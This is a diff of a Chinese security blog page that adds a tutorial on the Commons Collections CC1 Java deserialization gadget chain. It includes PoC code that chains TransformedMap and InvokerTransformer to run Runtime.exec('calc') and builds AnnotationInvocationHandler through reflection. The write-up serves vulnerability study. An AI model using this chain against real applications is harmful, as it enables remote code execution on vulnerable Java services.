+<h3 id="3-wan-zheng-lian-zi"><a href="#3-完整链子" class="headerlink" title="3.完整链子"></a>3.完整链子<a href="#3-wan-zheng-lian-zi" class="header-anchor">#</a></h3><ul>
+<li>目前找到的链子位于 <code>checkSetValue</code> 当中，去找 <code>.decorate</code> 的链子，发现无法进一步前进了，所以我们回到 <code>checkSetValue</code> 重新找链子。</li>
+</ul>
+<p>继续 <code>find usages</code>，找到了 <code>parent.checkSetValue(value);</code> 调用了 <code>checkSetValue</code></p>
+<p><img src="/images/JAVA反序列化04/FindCheckSetValue.png" alt="img"></p>
+<p>我们点进去看，发现这是一个名为 <code>AbstractInputCheckedMapDecorator</code> 的<code>抽象类</code>，是 <code>TransformedMap</code> 的父类。</p>
+<p><img src="/images/JAVA反序列化04/image-20230114175224373.png" alt="image-20230114175224373"></p>
+<ul>
+<li>调用 <code>checkSetValue</code> 方法的类是 <code>AbstractInputCheckedMapDecorator</code> 类中的一个内部类 <code>MapEntry</code></li>
+</ul>
+<p><img src="/images/JAVA反序列化04/MapEntry.png" alt="img"></p>
+<p>接下来我们继续前面的操作，构造链子弄出一个调用上图 setValue 的对象来。当前的 setValue 方法 隶属于 AbstractInputCheckedMapDecorator 类中的 MapEntry 类，所以我们肯定是要弄一个 MapEntry 类对象出来，但是 MapEntry 作为 AbstractInputCheckedMapDecorator 的内部类是不可以直接访问的。要访问内部类，可以通过创建外部类的对象，然后创建内部类的对象来实现。在这里我们已经有一个外部类 TransformedMap 对象了(不要忘记 TransformedMap 类继承了 AbstractInputCheckedMapDecorator),但 TransformedMap.java 中没有和MapEntry 相关的方法,所以我们在 AbstractInputCheckedMapDecorator.java 页面输入 <code>ctrl + f</code> 查找和 MapEntry 相关的方法</p>
+<p>经过查看可以知道 AbstractInputCheckedMapDecorator 有一个内部类 EntrySetIterator。这个类的 next 方法就实例化了一个 MapEntry 对象。</p>
+<p><img src="/images/JAVA反序列化04/image-20230115133546821.png" alt="image-20230115133546821"></p>
+<p>所以我们看看有什么办法能够实例化一个 EntrySetIterator对象并调用其 next 方法。经过查看发现 AbstractInputCheckedMapDecorator 类的静态内部类 EntrySet 的 iterator 方法 可以做到这一点。</p>
+<p><img src="/images/JAVA反序列化04/image-20230115134918137.png" alt="image-20230115134918137"></p>
+<p>继续找能实例化 EntrySet 类的方法，发现 entrySet 方法可以做到，这是一个 AbstractInputCheckedMapDecorator  类的普通方法，会返回一个 Set。</p>
+<p><img src="/images/JAVA反序列化04/image-20230115135637097.png" alt="image-20230115135637097"></p>
+<p>到这里我们终于可以停下来了，因为这是一个我们可以直接实例化对象并调用的方法。只需要调用 AbstractInputCheckedMapDecorator（实际是 TransformedMap 类） 类的 entrySet 得到一个 EntrySet 实例对象并进行遍历（这样才会调用到EntrySet的iterator方法，具体为什么可以打断点分析，不展开说了否则没完没了），遍历的时候可以获得一个 MapEntry 类对象，我们调用其 setValue 方法就可以完成链子的构造。</p>
+<p>我们可以写一段代码来调试一下，看一看在遍历 Map 的时候，会不会走到 <code>setValue</code> 中。在 <code>setValue</code> 的 192 行打个断点，并修改一下我们的 Poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span></span><br><span class="line">                , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        <span class="comment">// decorateMap 是一个 TransformedMap 类对象 （class org.apache.commons.collections.map.TransformedMap）</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry:decorateMap.entrySet())&#123;</span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>发现确实跟进来了：</p>
+<p><img src="/images/JAVA反序列化04/image-20230114203811881.png" alt="image-20230114203811881"></p>
+<blockquote>
+<p>更具体的可以打断点慢慢分析，这里涉及到外部类调用内部类、内部类又去调用自己的子类等，过程特别冗长，不分析下去了。</p>
+</blockquote>
+<p>运行完之后就可以弹计算器出来！</p>
+<p>到这一步我们的 POC 马上就要出来了，就差一个 <code>readObject</code> 了。接下来要做的事情就是找到一个 <code>readObject</code> 并且里面调用了 <code>setValue()</code> 方法</p>
+<h3 id="4-xun-zhao-readobject-lian-shou"><a href="#4-寻找-readObject-链首" class="headerlink" title="4.寻找 readObject() 链首"></a>4.寻找 readObject() 链首<a href="#4-xun-zhao-readobject-lian-shou" class="header-anchor">#</a></h3><ul>
+<li>之前链子是到 <code>setValue</code> 的，所以我们在 <code>setValue</code> 处，find usages</li>
+</ul>
+<p>不多说，下图直接给出我们 readObject 的入口类</p>
+<p><img src="/images/JAVA反序列化04/image-20230115144620313.png" alt="image-20230115144620313"></p>
+<ul>
+<li>我们注意到类的名字为 <code>AnnotationInvocationHandler</code>，<code>InvocationHandler</code> 这个后缀，我在动态代理里面提到过，是用做<strong>动态代理中间处理</strong>，因为它继承了 <code>InvocationHandler</code> 接口。</li>
+</ul>
+<blockquote>
+<p>这个 readObject 是在进行 Map 遍历的时候调用的 setValue 方法，该说不说这简直完美契合我们之前的链子，难怪被大佬们拿来作为入口类！</p>
+</blockquote>
+<p><img src="/images/JAVA反序列化04/image-20230115145356647.png" alt="image-20230115145356647"></p>
+<p>上图的 <code>memberValues</code> 我们可以在 AnnotationInvocationHandler 类的构造函数中传入，这是一个可控参数。我们只要让其为上一步的 TransformedMap 实例对象就可以。但是 AnnotationInvocationHandler 的作用域为 <code>default</code>，所以我们需要通过反射的方式来获取这个类及其构造函数</p>
+<p><img src="/images/JAVA反序列化04/image-20230115153904226.png" alt="image-20230115153904226"></p>
+<p>但是还有两个 if 判断会阻拦我们进入 setValue 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">               <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">               <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                     value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/JAVA反序列化04/image-20230115160022559.png" alt="image-20230115160022559"></p>
+<h5 id="ru-he-tong-guo-di-yi-ge-if"><a href="#如何通过第一个-if" class="headerlink" title="如何通过第一个 if"></a>如何通过第一个 if<a href="#ru-he-tong-guo-di-yi-ge-if" class="header-anchor">#</a></h5><p>接下来说说如何过第一个 if，以下是和第一个 if 有关联的语句。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// 一些代码</span></span><br><span class="line">        &#125;</span><br><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123; </span><br></pre></td></tr></table></figure>
+<p>先分析第一个部分</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// 一些代码</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>跟进到 AnnotationType.getInstance，该方法对于一个给定的注解类型会返回其实例，参数是一个 Class 类型</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> AnnotationType <span class="title function_">getInstance</span><span class="params">(</span></span><br><span class="line"><span class="params">    Class&lt;? extends Annotation&gt; annotationClass)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">JavaLangAccess</span> <span class="variable">jla</span> <span class="operator">=</span> sun.misc.SharedSecrets.getJavaLangAccess();</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">result</span> <span class="operator">=</span> jla.getAnnotationType(annotationClass); <span class="comment">// volatile read</span></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">//一些代码，不重要，因为我们的 result 不为空</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>示例如下：</p>
+<p><img src="/images/JAVA反序列化04/image-20230115164300770.png" alt="image-20230115164300770"></p>
+<p>我们传入的参数值是 <code>type</code>，而这个值可以在构造函数中定义</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        省略了一些不重要的代码</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>之后是第二个部分</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// 一些代码</span></span><br><span class="line">        &#125;</span><br><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br></pre></td></tr></table></figure>
+<p>跟进到 memberTypes，这个方法会返回注解类型的 member type，是一个 Map</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns member types for this annotation type</span></span><br><span class="line"><span class="comment">     * (member name -&gt; type mapping).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Class&lt;?&gt;&gt; memberTypes() &#123;</span><br><span class="line">        <span class="keyword">return</span> memberTypes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>示例：</p>
+<p><img src="/images/JAVA反序列化04/image-20230115165133347.png" alt="image-20230115165133347"></p>
+<p><img src="/images/JAVA反序列化04/image-20230115165023655.png" alt="image-20230115165023655"></p>
+<p>最后第一个部分</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123; </span><br></pre></td></tr></table></figure>
+<p>前面已经分析了，memberTypes 是一个 Map，现在以 name 为键读取其相应的 value 就是最终的 memberType。而 name 是 memberValue 这个 entry 的key，而此 entry 来自于我们可控的 memberValues。</p>
+<p>所以若在构造函数中让 type 为 Taget.class，这样我们的 memberTypes就为</p>
+<blockquote>
+<p>{value=class [Ljava.lang.annotation.ElementType;}</p>
+</blockquote>
+<p>这样让 name 为 value 就可这需要让 memberValue 这个 entry 的键为 value,所以我们可以如下构造 AnnotationInvocationHandler 类对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span></span><br><span class="line">                    , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">            HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxx&quot;</span>); <span class="comment">//关键点</span></span><br><span class="line">Map&lt;Object, Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,decorateMap);</span><br></pre></td></tr></table></figure>
+<h3 id="can-kao-lian-jie"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接<a href="#can-kao-lian-jie" class="header-anchor">#</a></h3><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&amp;vd_source=ed636173e6c328be468a244d33ee03e1">白日梦组长大佬</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h0cksr/p/16189755.html">java反序列化(三)CommonsCollections篇 — CC1</a></p>
 <p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1242/#commons-collections">Java安全之反序列化篇-URLDNS&amp;Commons Collections 1-7反序列化链分析</a></p>
 
   </div>
@@ -253,7 +408,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#qian-yan"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#huan-jing-da-jian"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pom-xml-tian-jia-yi-lai"><span class="toc-number">2.1.</span> <span class="toc-text">pom.xml 添加依赖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xiu-gai-sun-bao"><span class="toc-number">2.2.</span> <span class="toc-text">修改 sun 包</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lou-dong-fu-xian"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-kao-lian-jie"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#common-collections-xiang-guan-jie-shao"><span class="toc-number">1.</span> <span class="toc-text">Common-Collections 相关介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#qian-yan"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#huan-jing-da-jian"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pom-xml-tian-jia-yi-lai"><span class="toc-number">1.2.1.</span> <span class="toc-text">pom.xml 添加依赖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xiu-gai-sun-bao"><span class="toc-number">1.2.2.</span> <span class="toc-text">修改 sun 包</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#transformmap-ban-cc1-gong-ji-lian-fen-xi"><span class="toc-number">2.</span> <span class="toc-text">TransformMap 版 CC1 攻击链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fan-xu-lie-hua-gong-ji-si-lu"><span class="toc-number">2.1.</span> <span class="toc-text">反序列化攻击思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-xun-zhao-wei-bu-de-exec-fang-fa"><span class="toc-number">2.2.</span> <span class="toc-text">1.寻找尾部的 exec 方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-chu-bu-xun-zhao-lian-zi"><span class="toc-number">2.3.</span> <span class="toc-text">2.初步寻找链子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-wan-zheng-lian-zi"><span class="toc-number">2.4.</span> <span class="toc-text">3.完整链子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-xun-zhao-readobject-lian-shou"><span class="toc-number">2.5.</span> <span class="toc-text">4.寻找 readObject() 链首</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ru-he-tong-guo-di-yi-ge-if"><span class="toc-number">2.5.0.1.</span> <span class="toc-text">如何通过第一个 if</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-kao-lian-jie"><span class="toc-number">2.6.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
@@ -268,8 +423,7 @@
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://example.com/2023/01/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/index.html&title=JAVA反序列化04"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://example.com/2023/01/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/index.html&title=JAVA反序列化04"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://example.com/2023/01/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/index.html&name=JAVA反序列化04&description=&lt;!--toc--&gt;
-
-&lt;p&gt;Java 反序列化 CommonsCollections 篇01-CC1 链&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+&lt;p&gt;这一篇分析 Java 反序列化 CommonsCollections 的 CC1 链。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://example.com/2023/01/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9604/index.html&t=JAVA反序列化04"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
